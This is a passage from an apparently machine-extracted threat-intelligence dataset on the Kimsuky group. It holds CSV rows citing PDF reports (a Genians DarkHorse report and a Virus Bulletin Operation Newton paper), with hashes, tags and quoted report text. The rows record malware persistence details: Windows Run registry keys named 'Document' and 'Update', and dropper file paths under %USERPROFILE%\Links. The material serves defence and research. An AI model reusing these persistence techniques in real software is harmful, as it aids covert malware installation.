파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:dabeb8a648d58afd585267be97ced8dbd4dff2b0e5896e67d914670c16cd2ecc,observation--sha256:4fe3bd4a68c44edb6964dcf529e9a0ae68dcc1531993d4b0f26948d62f4fc259,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Update,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Update,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:e5c916c3ae1ba85da2cdb1ec0cf57be0c54067eb7a7742ff48fc138ca897700d,observation--sha256:15abf604aa21808a6e49e8e7932ad6e98421fadc109b138c9b772efced067280,sample-string,Thallium,Thallium,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 24}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 24 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Interesting string: Thallium The Kimsuky group is also known as ‘Thallium’. The ‘Thallium’ string was found in the AppleSeed code. Example of using the Thallium string in AppleSeed for Android: Example of the Thallium string used in server-side code to communicate with AppleSeed for Android:,
